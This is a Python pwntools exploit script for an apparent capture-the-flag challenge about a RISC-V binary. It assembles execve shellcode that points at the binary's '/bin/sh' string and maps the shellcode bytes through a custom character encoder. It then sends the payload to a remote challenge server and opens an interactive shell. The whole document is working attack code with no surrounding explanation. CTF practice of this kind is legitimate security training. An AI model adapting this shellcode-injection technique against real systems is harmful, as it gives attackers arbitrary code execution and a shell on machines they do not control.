#!/usr/bin/env python3
from pwn import *


elf = context.binary = ELF("/home/user/Desktop/sh2024/riscv/chal")
context.log_level = "CRITICAL"

# p = process("qemu-riscv64 -L /usr/riscv64-linux-gnu chal".split())
# qemu-riscv64 -L /usr/riscv64-linux-gnu -g 1234 chal  # to debug
# gdb-multiarch -ex 'target remote localhost:1234' -ex 'set architecture riscv'  # to debug
p = remote ("spaceheroes-a-riscv-maneuver.chals.io", 443, ssl=True, sni="spaceheroes-a-riscv-maneuver.chals.io")

custom_encoder = {
    0: "0",
    1: "A",
    8: "B",
    13: "C",
    69: "D",
    70: "E",
    71: "F",
    72: "G",
    73: "H",
    101: "I",
    115: "J",
    129: "K",
    147: "L",
    208: "M",
}

bin_sh = next(elf.search(b'/bin/sh'))
print(f"FOUND /bin/sh at address: {hex(bin_sh)}")

shellcode = b''
shellcode += asm(f'li a0, {hex(bin_sh)}')
shellcode += asm('li a1, 0')
shellcode += asm('li a1, 0')
shellcode += asm('li a1, 0')
shellcode += asm('li a1, 0')
shellcode += asm('li a1, 0')
shellcode += asm('li a2, 0')
shellcode += asm('li a7, 221')
shellcode += asm('ecall')

payload = ''
for i in shellcode:
    payload += custom_encoder[i]

payload = payload.rjust(0x50, '0')
print(f"SHELLCODE: {payload}, length -> {len(payload)}")

p.recvuntil(b'\n\n').decode(errors='ignore')
for i in payload:
    p.sendline(i.encode())

p.interactive()
